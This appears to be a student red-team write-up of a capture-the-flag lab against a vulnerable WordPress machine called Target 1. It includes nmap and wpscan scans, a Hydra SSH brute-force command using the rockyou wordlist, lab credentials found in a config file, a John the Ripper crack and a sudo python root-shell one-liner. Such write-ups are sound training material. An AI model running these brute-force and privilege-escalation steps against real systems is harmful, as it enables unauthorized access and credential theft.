# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

```bash
$ nmap -sV 192.168.1.110
```

![nmapscan_Target1_img1]()

This scan identifies the services below as potential points of entry:
- Target 1
  - Port 22 - SSH
  - Port 80 - HTTP
  - Port 111 - rpcbind
  - Port 139 - netbios-ssn Samba smbd 3.X - 4.X (workgrou: WORKGROUP)
  - Port 445 - netbios-ssn Samba smbd 3.X - 4.X (workgrou: WORKGROUP)

The following vulnerabilities were identified on each target:
- Target 1
  - SSH exposed to bruce force Attempts without multifactor authentication
  - HTTP port 80 allows for web traffic to pass through, and can expose files if not properly managed
  - NeBIOS Port 139 - If this system is going to be exposed to the internet it is advised to block this port from being accessed.
  - NetBIOS SMB port 445 - used in wannacry and notPetya ransomware attacks.  It is advised not to expose this to the internet like you would with a wordpress server.

wpscan -o ~/Desktop/wpscan_output --url http://1292.168.1.110/wordpress

![wpscan_Target1_img1](Images/Flag1_WPScan_1_Target1.png)

![wpscan_Target1_img2](Images/Flag1_WPScan_2_Target1.png)

### Exploitation

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
  - `michael`: _Password: 'michael'_
    - **Exploit Used**
      - _Hydra: hydra -l michael -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.110:22 -t 4_
      - _Alternative: Guessing_
      - _Alternative: Credential Stuffing_
![/Images/hydra_michael_BruteForce.png](michael_hydra_img1)
![/Images/Flag2.png](michael_img2)
  - `root`: _`mySQL` Password: R@v3nSecurity_
    - **Exploit Used**
      - _Used brute force credentials to gain ssh access_
      - _Discovered Credentials in plain text in config file_
      - _mysql -u root -p wordpress_
![/Images/wordpress_Config.png](MySQL_config_img1)
![/Images/MySQL_Access.png](MySQL_Access_img1)
  - `steven`: `Password:`_"pink84"_ `Hash:`_"See Image Below"_
    - **Exploit Used**
      - _mysql -u root -p wordpress_
      - _John the Ripper with RockYou Dictionary attack_
      - `sudo python -c 'import os; os.system("/bin/sh")'`_to gain root privilege_
![/Images/root_level_access.png](root_img1)
![/Images/Flag3_MySql.png](MySQL_Target1_img1)


- Flags

Flag 1:
![/Images/Flag1.png](Flag_img1)


Flag 2:
![/Images/Flag2.png](flag2_img1)

Flag 3:
![/Images/Flag3.png](Flag_3_MySQL_img1)

Flag 4:
![/Images/Flag4_root.png](Flag_4_root_img2)
